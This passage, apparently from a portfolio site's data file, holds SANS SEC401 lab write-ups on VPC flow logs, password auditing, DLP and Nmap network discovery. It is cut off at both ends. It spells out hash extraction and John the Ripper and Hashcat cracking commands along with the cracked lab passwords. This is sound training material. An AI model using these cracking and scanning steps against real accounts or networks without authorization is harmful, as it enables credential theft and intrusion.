      { src: "/labs/vpc-flow-logs-120457.png", alt: "Step 5: Determine attack timeframe", caption: "Sep 28 2023 5:22 PM - 11:59 PM UTC (~6.5 hours)" },
      { src: "/labs/vpc-flow-logs-120852.png", alt: "Step 6: Quantify data transfer", caption: "Port 8889: 265MB, Port 80: 190MB" },
      { src: "/labs/vpc-flow-logs-121229.png", alt: "Step 7: PCAP to NetFlow conversion", caption: "nfpcapd -r investigate.pcap -w exported-netflow/" },
      { src: "/labs/vpc-flow-logs-121431.png", alt: "Step 8: NetFlow analysis with nfdump", caption: "Structured flow data: Date, Duration, Proto, Src/Dst, Packets, Bytes" },
      { src: "/labs/vpc-flow-logs-121640.png", alt: "Step 9: Attacker HTTP flows", caption: "20.106.124.93:51278 to 10.130.8.94:80 (WordPress brute-force)" },
      { src: "/labs/vpc-flow-logs-121731.png", alt: "Step 10: Attacker SSH flows", caption: "20.106.124.93:38504 to 10.130.8.94:22 (SSH access)" },
      { src: "/labs/vpc-flow-logs-121856.png", alt: "Step 11: Non-standard port 8889", caption: "20.106.124.93:8889 to 10.130.8.94 (data exfiltration)" },
      { src: "/labs/vpc-flow-logs-121944.png", alt: "Step 12: Complete attack surface confirmed", caption: "No traffic beyond ports 80, 22, 8889" },
    ],
  },
  {
    id: 4,
    courseSlug: "sec401",
    slug: "password-auditing",
    title: "Password Auditing",
    course: "SEC401 - Defense in Depth",
    role: "Solo, Lab",
    context:
      "This lab demonstrates password auditing techniques using John the Ripper and Hashcat against multiple hash types: Microsoft Office encryption, NTLM, and Linux SHA-512 crypt. Starting with a CeWL-generated wordlist scraped from a target website, the goal was to crack passwords from an encrypted Excel spreadsheet, an NTLM hash dump, and Linux /etc/shadow files, then use John's word-mangling rules to expand the wordlist and crack stronger passwords that the base wordlist couldn't reach.",
    summary:
      "Cracked passwords across 4 hash types using John the Ripper and Hashcat: extracted and cracked an Office 2013 encrypted Excel file, an NTLM hash, and Linux crypt hashes using a CeWL wordlist. Demonstrated brute-force infeasibility against SHA-512 with Hashcat, then used John's word-mangling rules to expand 1,552 base words into 4M+ candidates to crack passwords the original wordlist missed.",
    whyThisMatters:
      "Password auditing is how organizations discover weak credentials before attackers do. Understanding hash types, choosing the right cracking tool and attack mode, and knowing when brute force is infeasible vs. when a smarter wordlist wins are core skills for penetration testers and security auditors. This lab builds that judgment.",
    focus: "Password Management & Cryptography",
    level: "SEC401",
    date: "Apr 2026",
    artifacts: "Sanitized screenshots from Slingshot Linux lab environment",
    tldr: [
      "Cracked Office 2013, NTLM, and Linux SHA-512 crypt passwords using John the Ripper with a CeWL wordlist",
      "Demonstrated SHA-512 brute-force infeasibility with Hashcat (77-year estimate at 854 H/s)",
      "Expanded 1,552 base words into 4M+ candidates with John's word-mangling rules to crack two remaining passwords",
    ],
    skillsDemonstrated: [
      "Hash extraction (office2john)",
      "John the Ripper wordlist attacks",
      "Hashcat mask attacks",
      "NTLM hash cracking",
      "Linux shadow file analysis",
      "CeWL wordlist reconnaissance",
      "Word-mangling rule expansion",
      "Hash type identification",
    ],
    tools: ["John the Ripper", "Hashcat", "office2john", "unshadow", "CeWL", "LibreOffice", "CLI"],
    steps: [
      "Explored lab files: alphapasswd, alphashadow, bonuspasswd, bonusshadow, cewl-pass.txt, customer-discount.xlsx, ntlm.txt",
      "Identified customer-discount.xlsx as CDFV2 Encrypted, confirmed password-protected via LibreOffice",
      "Examined CeWL wordlist (cewl-pass.txt): 1,552 words scraped from target website",
      "Extracted Office hash with office2john.py: python3 /opt/john/run/office2john.py customer-discount.xlsx > excelhash",
      "Viewed extracted Office 2013 hash structure",
      "Cracked Excel password with John: #AlphaInc! (Office 2007/2010/2013 format, 168 p/s)",
      "Attempted NTLM crack without specifying format: ambiguous hash type warnings (LM vs NT)",
      "Specified --format=NT to crack NTLM hash: #AlphaInc! (19,200 p/s with MD4)",
      "Combined Linux passwd/shadow with unshadow: alphapasswd + alphashadow > alphamerge",
      "Cracked Linux crypt hash with John: #AlphaInc! for alphauser (SHA-512 crypt, 701 p/s)",
      "Attempted Hashcat brute-force on SHA-512 (mode 1800): mask ?u?l?l?l?l?l?l?l?l?d",
      "Hashcat status: 854 H/s, estimated 77 years to complete brute-force",
      "Unshadowed bonus files, attempted CeWL wordlist: 0 passwords cracked",
      "Generated mangled wordlist with John --rules: 1,552 base words expanded to 4,010,859 candidates",
      "Verified rule expansion: 2,156 variants of a single word, 4M+ total candidates",
      "Cracked both bonus passwords with rules-expanded wordlist: #AlphaInc!23 (larry), #AlphaInc!24 (joshua)",
    ],
    stepDetails: [
      {
        title: "Explore lab files",
        description:
          "Listed the lab directory contents: alphapasswd, alphashadow, bonuspasswd, bonusshadow (Linux credential files), cewl-pass.txt (wordlist), customer-discount.xlsx (encrypted spreadsheet), and ntlm.txt (Windows hash). Used the file command to confirm the Excel file was CDFV2 Encrypted.",
        command: "cd /sec401/labs/2.1/ && ls -l\nfile customer-discount.xlsx",
        commandBreakdown: "ls -l: detailed file listing with sizes\nfile: identify file type and encryption status",
        screenshot: "/labs/password-auditing-131636.png",
      },
      {
        title: "Confirm password-protected Excel file",
        description:
          "Opened customer-discount.xlsx with LibreOffice to confirm it requires a password. The dialog prompted for a password to decrypt the file, confirming the Office encryption detected by the file command.",
        screenshot: "/labs/password-auditing-131652.png",
      },
      {
        title: "Examine CeWL wordlist",
        description:
          "Opened cewl-pass.txt in gedit. The wordlist contains 1,552 words scraped from the target organization's website using CeWL (Custom Word List generator). Words include company-specific terms like 'SolarGlow', 'Arctic', and social media references. Organization-specific wordlists are far more effective than generic dictionaries because employees often base passwords on familiar terms.",
        command: "gedit cewl-pass.txt",
        screenshot: "/labs/password-auditing-131755.png",
      },
      {
        title: "Extract Office hash with office2john",
        description:
          "Used office2john.py to extract the password hash from the encrypted Excel file. The script outputs a hash string compatible with John the Ripper. After extraction, ls -l confirms the new excelhash file was created.",
        command: "python3 /opt/john/run/office2john.py customer-discount.xlsx > excelhash",
        commandBreakdown: "office2john.py: extracts password hash from Office documents\n> excelhash: redirect hash to file for cracking",
        screenshot: "/labs/password-auditing-131937.png",
      },
      {
        title: "View extracted Office hash",
        description:
          "Inspected the extracted hash. The format shows $office$*2013*100000*256*16* followed by the hash data. Key fields: Office 2013 format, 100,000 PBKDF2 iterations, 256-bit key length. The high iteration count makes brute-force significantly slower than simpler hash types.",
        command: "cat excelhash",
        screenshot: "/labs/password-auditing-132029.png",
      },
      {
        title: "Crack Excel password with John",
        description:
          "Ran John the Ripper with the CeWL wordlist against the Office hash. John detected Office 2007/2010/2013 format (SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES). Cracked the password in under 1 second: #AlphaInc! at 168.4 passwords/second. The low speed reflects the 100,000 PBKDF2 iterations in Office 2013 encryption.",
        command: "john --wordlist=cewl-pass.txt excelhash",
        commandBreakdown: "--wordlist=cewl-pass.txt: use CeWL wordlist\nexcelhash: target hash file",
        screenshot: "/labs/password-auditing-132058.png",
      },
      {
        title: "NTLM hash type ambiguity",
        description:
          "Attempted to crack ntlm.txt without specifying a format. John detected hash type 'LM' but warned it could also match dozens of other formats (NT, MD2, MD4, MD5, mscash, ripemd-128, and many more). This demonstrates why specifying the correct format is critical when the hash is ambiguous.",
        command: "john --wordlist=cewl-pass.txt ntlm.txt",
        screenshot: "/labs/password-auditing-132355.png",
      },
      {
        title: "Crack NTLM hash with correct format",
        description:
          "Specified --format=NT to force NTLM (MD4) interpretation. John loaded 1 password hash and cracked it instantly: #AlphaInc! at 19,200 passwords/second. The dramatic speed difference vs. Office 2013 (19,200 vs. 168 p/s) shows why unsalted, un-iterated hashes like NTLM are trivial to crack.",
        command: "john --wordlist=cewl-pass.txt ntlm.txt --format=NT",
        commandBreakdown: "--format=NT: force NTLM (MD4) hash type\nNT hash = MD4(UTF-16LE(password))",
        screenshot: "/labs/password-auditing-132458.png",
      },
      {
        title: "Combine Linux passwd and shadow files",
        description:
          "Used unshadow to merge alphapasswd and alphashadow into a single file suitable for John. The output shows two users: alphauser (UID 1002, $y$ yescrypt hash) and alpha2 (UID 1003, $6$ SHA-512 crypt hash). Different hash prefixes indicate different algorithms.",
        command: "unshadow alphapasswd alphashadow > alphamerge\ncat alphamerge",
        commandBreakdown: "unshadow: merge /etc/passwd and /etc/shadow into John-compatible format",
        screenshot: "/labs/password-auditing-132610.png",
      },
      {
        title: "Crack Linux crypt hash",
        description:
          "Ran John with --format=crypt against the merged shadow file. Loaded 2 hashes with different salts (algorithms ranging from descrypt to sha512crypt). Cracked alphauser's password: #AlphaInc! at 701.2 candidates/second. The 5,000 SHA-512 iterations make this slower than NTLM but faster than Office 2013.",
        command: "john --format=crypt --wordlist=cewl-pass.txt alphamerge",
        commandBreakdown: "--format=crypt: use generic Unix crypt format\nHandles multiple algorithms (md5crypt, sha256crypt, sha512crypt)",
        screenshot: "/labs/password-auditing-132715.png",
      },
      {
        title: "Hashcat brute-force attempt on SHA-512",
        description:
          "Attempted a brute-force mask attack with Hashcat on the SHA-512 crypt hash. Used mode 1800 (sha512crypt) with attack mode 3 (brute-force) and mask ?u?l?l?l?l?l?l?l?l?d (1 uppercase + 8 lowercase + 1 digit). Hashcat initialized OpenCL on the Intel i7-8750H CPU but hit a token length exception on one hash entry.",
        command: "hashcat -m 1800 -a 3 alphamerge ?u?l?l?l?l?l?l?l?l?d",
        commandBreakdown: "-m 1800: SHA-512 crypt hash mode\n-a 3: brute-force/mask attack\n?u: uppercase letter\n?l: lowercase letter\n?d: digit",
        screenshot: "/labs/password-auditing-132939.png",
      },
      {
        title: "Hashcat status: brute-force infeasible",
        description:
          "Pressed 's' for status. Hashcat reported: SHA-512 (Unix) mode, 854 H/s on the CPU, estimated completion in 77 years 177 days. Progress: 45,024 of 2,088,270,645,760 candidates (0.00%). This demonstrates why brute-force is impractical against properly iterated hashes like SHA-512 crypt, especially without GPU acceleration.",
        screenshot: "/labs/password-auditing-132957.png",
      },
      {
        title: "Bonus challenge: CeWL wordlist fails",
        description:
          "Unshadowed the bonus passwd/shadow files and attempted John with the base CeWL wordlist. Result: 0 passwords cracked. The bonus passwords aren't in the original 1,552-word list, meaning they use variations (appended numbers, mixed case, etc.) that require word-mangling rules to discover.",
        command: "unshadow bonuspasswd bonusshadow > bonus_passwords\njohn --wordlist=cewl-pass.txt bonus_passwords",
        commandBreakdown: "unshadow: merge bonus credential files\n--wordlist: attempt base CeWL wordlist",
        screenshot: "/labs/password-auditing-133202.png",
      },
      {
        title: "Generate mangled wordlist with John rules",
        description:
          "Used John's --rules flag with --stdout to apply word-mangling transformations (case toggling, number appending, character substitution, etc.) to every word in the CeWL list, redirecting all generated candidates to cewl-rules.txt. This massively expands the effective wordlist without manual effort.",
        command: "john --wordlist=cewl-pass.txt --rules --stdout > cewl-rules.txt",
        commandBreakdown: "--rules: enable default word-mangling rules\n--stdout: output candidates instead of cracking\n> cewl-rules.txt: save expanded wordlist",
        screenshot: "/labs/password-auditing-133315.png",
      },
      {
        title: "Verify rule expansion scale",
        description:
          "Compared wordlist sizes: the base cewl-pass.txt had 1,552 lines. After rule expansion, cewl-rules.txt had 4,010,859 lines, a 2,585x increase. Grep confirmed 2,156 variants generated from a single word ('merely'). This shows how rules systematically cover common password mutation patterns.",
        command: "wc -l cewl-pass.txt\nwc -l cewl-rules.txt\ngrep merely cewl-rules.txt | wc -l",
        commandBreakdown: "wc -l: count lines (candidates)\ngrep | wc -l: count variants of a specific word",
        screenshot: "/labs/password-auditing-133535.png",
      },
      {
        title: "Crack bonus passwords with expanded wordlist",
        description:
          "Ran John with the rules-expanded wordlist against the bonus hashes. Both passwords cracked in 36 seconds: #AlphaInc!23 (larry) and #AlphaInc!24 (joshua). The base word '#AlphaInc!' was in the original CeWL list, but the appended numbers '23' and '24' required rule-generated variants. This demonstrates why word-mangling rules are essential for real-world password auditing.",
        command: "john --wordlist=cewl-rules.txt bonus_passwords",
        commandBreakdown: "--wordlist=cewl-rules.txt: use rules-expanded 4M-candidate wordlist",
        screenshot: "/labs/password-auditing-133647.png",
      },
    ],
    outcome:
      "This lab covered the full password auditing workflow: identifying hash types, choosing the right tool and attack mode, and understanding when to switch from brute force to smarter wordlist techniques. The key takeaway was the contrast between hash strengths: NTLM cracked at 19,200 p/s while SHA-512 crypt managed only 854 H/s under brute force, making it computationally infeasible without a targeted wordlist. The CeWL-to-rules pipeline proved that organization-specific wordlists combined with systematic word-mangling rules can crack passwords that resist both dictionary and brute-force attacks.",
    nextStepsInProduction:
      "If this were a real engagement: I'd report all cracked credentials to the organization with remediation timelines, recommend enforcing minimum 16-character passphrases and banning company-name-based passwords, check for credential reuse across systems, verify that NTLM authentication is disabled where possible in favor of Kerberos, and recommend migrating from SHA-512 crypt to bcrypt or argon2 with higher work factors.",
    securityControlsRelevant: [
      "Enforce strong password policies (length > complexity)",
      "Ban organization-specific words in passwords (Azure AD Custom Banned Passwords)",
      "Disable NTLM authentication where possible",
      "Use modern hash algorithms (bcrypt, argon2) with high work factors",
      "Regular password auditing with internal red team tools",
      "MFA on all accounts to reduce credential-only attack impact",
    ],
    keyFindings: [
      "Office 2013: #AlphaInc! cracked at 168 p/s (100K PBKDF2 iterations)",
      "NTLM: #AlphaInc! cracked at 19,200 p/s (unsalted MD4, trivially fast)",
      "Linux SHA-512 crypt: #AlphaInc! cracked at 701 p/s (5,000 iterations)",
      "Hashcat brute-force on SHA-512: 854 H/s, 77-year estimated completion",
      "CeWL wordlist: 1,552 words expanded to 4,010,859 with John's mangling rules",
      "Bonus passwords (#AlphaInc!23, #AlphaInc!24) required rule-expanded wordlist to crack",
    ],
    takeaway: [
      "The speed difference between hash types is the real lesson here, not the cracking itself. NTLM at 19,200 p/s vs. SHA-512 crypt at 854 H/s vs. Office 2013 at 168 p/s tells you everything about why hash algorithm choice matters more than password policy. An organization can mandate 16-character passwords, but if Active Directory is still storing NTLM hashes (and it is, by default), an attacker with a domain dump will crack most of them in hours. The first recommendation in any password audit should be 'disable NTLM where possible,' not 'require longer passwords.'",
      "CeWL is underrated in real engagements. Generic wordlists like rockyou.txt contain millions of entries but miss the most likely passwords: the ones employees create from what they see every day. The company name, product names, office locations, slogans from the website. In this lab, every single password was a variation of '#AlphaInc!' which is literally the organization's name with common substitutions. Azure AD and Entra ID have Custom Banned Password Lists that can block these, but I've rarely seen organizations configure them. It's a 10-minute fix that would have stopped every crack in this lab.",
      "The brute-force attempt with Hashcat was the most instructive failure. 77 years at 854 H/s on a single CPU. Even with GPU acceleration pushing that to 500K H/s, a 10-character password with mixed character classes would still take months against SHA-512 crypt. This is why password complexity requirements exist for older hash algorithms, but also why the industry is moving toward bcrypt and argon2 with configurable work factors. The right answer isn't 'make passwords longer,' it's 'make hashing slower.' A properly configured argon2 hash turns even a weak password into a computationally expensive target.",
    ],
    screenshots: [
      { src: "/labs/password-auditing-131636.png", alt: "Step 1: Explore lab files", caption: "Lab directory: passwd/shadow files, CeWL wordlist, encrypted Excel, NTLM hash" },
      { src: "/labs/password-auditing-131652.png", alt: "Step 2: Password-protected Excel", caption: "LibreOffice prompts for password to open customer-discount.xlsx" },
      { src: "/labs/password-auditing-131755.png", alt: "Step 3: CeWL wordlist", caption: "1,552 organization-specific words scraped from target website" },
      { src: "/labs/password-auditing-131937.png", alt: "Step 4: Extract Office hash", caption: "office2john.py customer-discount.xlsx > excelhash" },
      { src: "/labs/password-auditing-132029.png", alt: "Step 5: Office 2013 hash structure", caption: "$office$*2013*100000*256*16* (100K PBKDF2 iterations)" },
      { src: "/labs/password-auditing-132058.png", alt: "Step 6: Crack Excel password", caption: "John + CeWL wordlist: #AlphaInc! at 168 p/s" },
      { src: "/labs/password-auditing-132355.png", alt: "Step 7: NTLM hash type ambiguity", caption: "John warns: LM detected but dozens of formats match" },
      { src: "/labs/password-auditing-132458.png", alt: "Step 8: Crack NTLM with --format=NT", caption: "#AlphaInc! at 19,200 p/s (MD4, no salt, no iterations)" },
      { src: "/labs/password-auditing-132610.png", alt: "Step 9: unshadow Linux credentials", caption: "Merged alphapasswd + alphashadow: yescrypt and SHA-512 hashes" },
      { src: "/labs/password-auditing-132715.png", alt: "Step 10: Crack Linux crypt hash", caption: "John --format=crypt: #AlphaInc! for alphauser at 701 p/s" },
      { src: "/labs/password-auditing-132939.png", alt: "Step 11: Hashcat brute-force attempt", caption: "hashcat -m 1800 -a 3: SHA-512 mask attack with OpenCL" },
      { src: "/labs/password-auditing-132957.png", alt: "Step 12: Brute-force infeasible", caption: "854 H/s, estimated 77 years for SHA-512 crypt" },
      { src: "/labs/password-auditing-133202.png", alt: "Step 13: CeWL wordlist fails on bonus", caption: "0 passwords cracked with base 1,552-word list" },
      { src: "/labs/password-auditing-133315.png", alt: "Step 14: Generate mangled wordlist", caption: "john --rules --stdout: systematic word transformations" },
      { src: "/labs/password-auditing-133535.png", alt: "Step 15: Rule expansion scale", caption: "1,552 words expanded to 4,010,859 candidates (2,585x)" },
      { src: "/labs/password-auditing-133647.png", alt: "Step 16: Crack bonus passwords", caption: "#AlphaInc!23 (larry), #AlphaInc!24 (joshua) in 36 seconds" },
    ],
  },
  {
    id: 5,
    courseSlug: "sec401",
    slug: "data-loss-prevention",
    title: "Data Loss Prevention",
    course: "SEC401 - Defense in Depth",
    role: "Solo, Lab",
    context:
      "This lab simulates a data loss prevention investigation on a removable media device (CDROM). The goal was to identify sensitive files using keyword scanning with grep, extract hidden metadata from Office documents using exiftool, and geolocate the origin of a photograph by extracting GPS coordinates embedded in its EXIF data.",
    summary:
      "Scanned removable media for sensitive content using grep keyword matching, extracted document metadata with exiftool revealing author identity and SECRET classification, and geolocated a photo's origin from embedded GPS coordinates.",
    whyThisMatters:
      "Data exfiltration via removable media remains one of the most common insider threat vectors. Organizations that don't scan outbound media miss classified documents walking out the door. Metadata in Office files and photos can reveal authorship, classification markings, and even physical locations that the sender never intended to share. DLP tools automate what this lab does manually, but understanding the underlying techniques is essential for tuning DLP policies and investigating incidents.",
    focus: "Data Security & DLP",
    level: "SEC401",
    date: "Apr 2026",
    artifacts: "Sanitized screenshots from Slingshot Linux lab environment",
    tldr: [
      "Used grep with regex to scan removable media and flag files containing 'secret', 'confidential', or 'sensitive'",
      "Extracted Office document metadata with exiftool: author, classification keyword (SECRET), and modification history",
      "Geolocated a photograph by extracting GPS coordinates from EXIF data and identifying the real-world location",
    ],
    skillsDemonstrated: [
      "DLP keyword scanning with grep",
      "Regex-based content classification",
      "Document metadata extraction (exiftool)",
      "EXIF GPS coordinate extraction",
      "Geolocation from image metadata",
      "Insider threat investigation",
      "Removable media forensics",
    ],
    tools: ["grep", "exiftool", "EXIF/GPS analysis", "CLI"],
    steps: [
      "Navigated to removable media mount: cd /media/sec401/CDROM/",
      "Scanned all files for sensitive keywords: grep -Pail '(secret|confidential|sensitive)' *",
      "Identified flagged file: Merger Offer Letter to Beta Industries.doc",
      "Extracted full metadata from Bankruptcy.docx with exiftool",
      "Identified metadata: Creator (Madison Jeffries), Keywords (SECRET), Last Modified By (Jerry Jackson)",
      "Opened image file and examined EXIF properties for embedded GPS coordinates",
      "Extracted GPS latitude and longitude from image metadata",
      "Converted GPS coordinates to identify the real-world location of the photograph",
    ],
    stepDetails: [
      {
        title: "Scan removable media for sensitive keywords",
        description:
          "Navigated to the mounted CDROM and used grep with Perl-compatible regex to scan all files for the words 'secret', 'confidential', or 'sensitive'. The -P flag enables PCRE, -a treats binary files as text, -i makes the search case-insensitive, and -l prints only filenames (not matching lines). One file matched: 'Merger Offer Letter to Beta Industries.doc', a document that would be flagged by any DLP system scanning for classification markers.",
        command: "cd /media/sec401/CDROM/\ngrep -Pail '(secret|confidential|sensitive)' *",
        commandBreakdown: "-P: Perl-compatible regex (supports alternation with |)\n-a: treat binary files as text (needed for .doc/.docx)\n-i: case-insensitive matching\n-l: print only filenames, not matching content",
        screenshot: "/labs/dlp-191215.png",
      },
      {
        title: "Extract document metadata with exiftool",
        description:
          "Ran exiftool against Bankruptcy.docx to extract all embedded metadata. Key findings: the document was created by Madison Jeffries, last modified by Jerry Jackson, and tagged with the keyword SECRET. Additional metadata reveals it was created in Microsoft Office Word (App Version 16.0000), has 358 words across 2 pages, and has a total edit time of 2,982,555 days. The Keywords field is particularly significant for DLP: this is where classification markings like SECRET, CONFIDENTIAL, or TOP SECRET are often stored in government and corporate environments.",
        command: "exiftool Bankruptcy.docx",
        commandBreakdown: "exiftool: read/write metadata in files (EXIF, IPTC, XMP, Office XML)\nOutputs all metadata fields including Creator, Keywords, Last Modified By",
        screenshot: "/labs/dlp-191858.png",
      },
      {
        title: "Geolocate photo from GPS coordinates",
        description:
          "Opened an image file and examined its EXIF properties, which revealed embedded GPS coordinates (GPSLatitude and GPSLongitude). Photographs taken with smartphones and GPS-enabled cameras automatically embed location data in the image file. By extracting these coordinates, the exact location where the photo was taken can be identified on a map. This is a major privacy and security concern: employees sharing photos from sensitive facilities, whistleblowers inadvertently revealing their location, or insiders documenting assets before exfiltration. DLP policies should strip EXIF data from outbound images or flag files containing GPS metadata.",
        screenshot: "/labs/dlp-192019.png",
      },
    ],
    outcome:
      "This lab demonstrated three core DLP investigation techniques: keyword scanning to identify sensitive content in files, metadata extraction to reveal document authorship and classification markings, and GPS coordinate extraction to geolocate the origin of photographs. The combination of grep for content inspection and exiftool for metadata analysis represents the manual equivalent of what enterprise DLP solutions automate at scale.",
    nextStepsInProduction:
      "If this were a real investigation: I'd correlate the document author (Madison Jeffries) and modifier (Jerry Jackson) with HR and access control records, escalate the SECRET-classified document found on removable media as a potential data spillage incident, implement DLP policies to scan removable media before data can be written to it, configure endpoint agents to strip EXIF/GPS data from outbound images, and review access logs to determine how classified documents reached the CDROM.",
    securityControlsRelevant: [
      "DLP policies scanning removable media for classification keywords",
      "Endpoint controls restricting USB/CDROM write access",
      "EXIF/GPS metadata stripping on outbound files",
      "Document classification enforcement (mandatory marking)",
      "Insider threat monitoring and behavioral analytics",
      "Data-at-rest scanning for misplaced classified documents",
    ],
    keyFindings: [
      "grep -Pail flagged 'Merger Offer Letter to Beta Industries.doc' containing sensitive keywords",
      "exiftool revealed Bankruptcy.docx: Creator (Madison Jeffries), Keywords (SECRET), Last Modified By (Jerry Jackson)",
      "Image EXIF data contained embedded GPS coordinates revealing the photo's geographic origin",
      "All three data leakage vectors (content, metadata, geolocation) found on a single removable device",
    ],
    takeaway: [
      "The grep scan is the simplest possible DLP check, and it's shocking how effective it is. A one-liner with three keywords caught a merger offer letter sitting on a CDROM. In a real organization, an insider copying M&A documents to removable media is a textbook exfiltration scenario. The SEC has prosecuted cases exactly like this. Enterprise DLP tools like Microsoft Purview, Symantec DLP, and Digital Guardian do the same thing at scale, scanning content against hundreds of classification patterns, but the underlying technique is identical: regex matching against file content. If you understand what grep -Pail does, you understand the detection engine behind a $500K DLP deployment.",
      "The exiftool output is where this gets interesting from an investigation standpoint. The Keywords field reads SECRET, which means someone explicitly classified this document and it still ended up on removable media. That's not an accidental leak; it's a control failure. The Creator and Last Modified By fields give you two names to investigate: Madison Jeffries authored it, Jerry Jackson edited it last. In a real incident response, you'd cross-reference these names against access control lists, check who had physical access to the CD burner, and pull endpoint logs to trace the chain of custody. Metadata is the forensic breadcrumb trail that most insiders forget to clean.",
      "The GPS coordinates in the image EXIF data are the most underestimated risk on this disc. Every smartphone photo embeds latitude and longitude by default unless the user explicitly disables location services. Military and intelligence organizations have standing orders to strip EXIF data before sharing any imagery, and there are documented cases where embedded GPS coordinates revealed the locations of forward operating bases. In a corporate context, a photo taken inside a data center, a lab, or a competitor's facility carries the same risk. The fix is straightforward: DLP policies should flag or strip GPS metadata from outbound files, and security awareness training should cover the risk of location-tagged photos. Most employees have no idea their phone is embedding a precise map coordinate in every picture they take.",
    ],
    screenshots: [
      { src: "/labs/dlp-191215.png", alt: "Step 1: Grep keyword scan", caption: "grep -Pail flags 'Merger Offer Letter to Beta Industries.doc' on CDROM" },
      { src: "/labs/dlp-191858.png", alt: "Step 2: exiftool metadata extraction", caption: "Bankruptcy.docx: Creator (Madison Jeffries), Keywords (SECRET), Modified By (Jerry Jackson)" },
      { src: "/labs/dlp-192019.png", alt: "Step 3: GPS coordinate extraction", caption: "Image EXIF properties reveal embedded GPS latitude and longitude" },
    ],
  },
  {
    id: 7,
    courseSlug: "sec401",
    slug: "network-discovery",
    title: "Network Discovery",
    course: "SEC401 - Vulnerability Management and Response",
    role: "Solo, Lab",
    focus: "Network Security",
    level: "SEC401",
    date: "Apr 2026",
    artifacts: "Sanitized screenshots of Nmap scans, ndiff baseline comparison, post-discovery SSH and iptables review",
    tldr: [
      "Enumerated a /24 lab network with Nmap ping, port, version, and OS scans",
      "Baselined results to XML and used ndiff to detect a new service between scans",
      "Pivoted to a discovered host to review netstat, iptables rules, and served content",
    ],
    skillsDemonstrated: [
      "Host discovery with Nmap -sn",
      "Service and version enumeration (-sV)",
      "OS fingerprinting (-O, --osscan-guess)",
      "XML output and ndiff baseline comparison",
      "Post-scan host triage (netstat, iptables, curl)",
      "Recognizing non-standard service ports",
    ],
    context:
      "This lab demonstrates a full network discovery workflow against a lab environment of seven Docker containers on 172.28.14.0/24, then pivots to one of the discovered hosts to validate what the scan found at the OS and firewall layer.",
    summary:
      "Ran Nmap against a /24 lab network: identified 7 live hosts, enumerated services (OpenSSH, MySQL, nginx, php-fpm), attempted OS fingerprinting, baselined results to XML, and used ndiff to catch a newly exposed Python WSGI server on port 8000. Confirmed the finding by SSHing in and reviewing netstat, iptables, and the served page.",
    whyThisMatters:
      "Network discovery is the first step of almost every attack and almost every defensive asset inventory. Knowing how to surface live hosts, services, and changes between scans is the difference between an asset inventory that reflects reality and a spreadsheet that went stale six months ago.",
    tools: ["Nmap", "ndiff", "ssh", "netstat", "iptables", "curl"],
    steps: [
      "Started lab environment: ./start_3.1.sh (7 containers up)",
      "Ping scan: nmap -sn 172.28.14.0/24 (7 hosts up)",
      "Top-100 / fast port sweeps with greppable output",
      "Service/version detection: nmap -sV 172.28.14.0/24",
      "OS detection: nmap -O and nmap -O --osscan-guess",
      "Second version scan written to XML: nmap -sV -oX new_network.xml",
      "ndiff network.xml new_network.xml (new 8000/tcp WSGIServer on docs host)",
      "SSH into docs host on non-standard port: ssh -p 80 root@172.28.14.23",
      "netstat -anp on target to confirm listening sockets",
      "iptables -n -L on target to see firewall rules for port 8000",
      "curl localhost:8000 to retrieve the Alpha Developers mkdocs site",
    ],
    stepDetails: [
      {
        title: "Lab environment startup",
        description:
          "Launched the lab stack from /sec401/labs/3.1. The start script brought up seven Docker containers: webapp, docs, database, old-database, php-fpm, php-nginx, and a student container used as the scanning host.",
        command: "cd /sec401/labs/3.1/ && ./start_3.1.sh",
        screenshot: "/labs/network-discovery-143816.png",
      },
      {
        title: "Ping sweep: discover live hosts",
        description:
          "Ran a host-discovery-only scan against the /24. Nmap reported 7 hosts up in 1.38 seconds, each with a 172.28.14.x address, matching the containers launched by the start script.",
        command: "nmap -sn 172.28.14.0/24",
        commandBreakdown: "-sn: ping scan, no port scan\n172.28.14.0/24: 256-address lab subnet",
        screenshot: "/labs/network-discovery-144231.png",
      },
      {
        title: "Greppable port sweeps",
        description:
          "Demonstrated two greppable-output scans: --top-ports 100 and the -F fast scan. Both ran against the default target (none supplied on the CLI), so they returned zero hosts. The point was to capture the exact port list each scan covers in the header comment for documentation.",
        command: "nmap -v --top-ports 100 -oG -\nnmap -v -F -oG -",
        commandBreakdown: "-v: verbose\n--top-ports 100: scan the 100 most common TCP ports\n-F: fast scan (~top 100 from nmap-services)\n-oG -: greppable output to stdout",
        screenshot: "/labs/network-discovery-144327.png",
      },
      {
        title: "Service and version detection",
        description:
          "Enumerated services on every live host: OpenSSH 8.9p1 on the docs host, MySQL 5.7.41/5.7.44 on the two database hosts, nginx 1.14.2 on php-nginx, an unknown cslistener on php-fpm:9000, and http/https on the webapp. CPE entries (cpe:/o:linux:linux_kernel) confirm a Linux target fleet.",
        command: "nmap -sV 172.28.14.0/24",
        commandBreakdown: "-sV: probe open ports for service/version info",
        screenshot: "/labs/network-discovery-144751.png",
      },
      {
        title: "OS detection: strict match",
        description:
          "Ran a strict OS fingerprint. Nmap collected a full TCP/IP signature for each host but reported 'No exact OS matches' because containers don't present a clean kernel fingerprint over the network.",
        command: "nmap -O 172.28.14.0/24",
        commandBreakdown: "-O: OS fingerprinting based on TCP/IP stack behavior",
        screenshot: "/labs/network-discovery-144947.png",
      },
      {
        title: "OS detection: aggressive guess",
        description:
          "Re-ran with --osscan-guess. Nmap returned probability-weighted matches: Linux 2.6.32 (96%), Linux 3.2-4.9 (96%), with odd long-tail guesses like AXIS 210A network camera and Synology DiskStation. Useful reminder that OS detection degrades badly against virtualized or containerized hosts.",
        command: "nmap -O --osscan-guess 172.28.14.0/24",
        commandBreakdown: "--osscan-guess: print closest matches even when no exact match",
        screenshot: "/labs/network-discovery-145219.png",
      },
      {
        title: "Baseline scan saved to XML",
        description:
          "Saved a second version scan to new_network.xml. XML output is the format ndiff consumes and the format most asset-management pipelines ingest.",
        command: "nmap -sV -oX new_network.xml 172.28.14.0/24",
        commandBreakdown: "-oX: XML output file",
        screenshot: "/labs/network-discovery-145528.png",
      },
      {
        title: "ndiff: detect scan-over-scan change",
        description:
          "Compared an older baseline (network.xml, Nov 2023) to new_network.xml (Apr 2026). ndiff surfaced a new listener on the docs host: 8000/tcp open http WSGIServer 0.2 (Python 3.10.12). This is the exact signal an asset inventory wants, a service that wasn't there before, on a host you thought you understood.",
        command: "ndiff network.xml new_network.xml",
        commandBreakdown: "ndiff: Nmap-aware diff of two XML scans, lines prefixed with + for added and - for removed",
        screenshot: "/labs/network-discovery-145601.png",
      },
      {
        title: "SSH on a non-standard port",
        description:
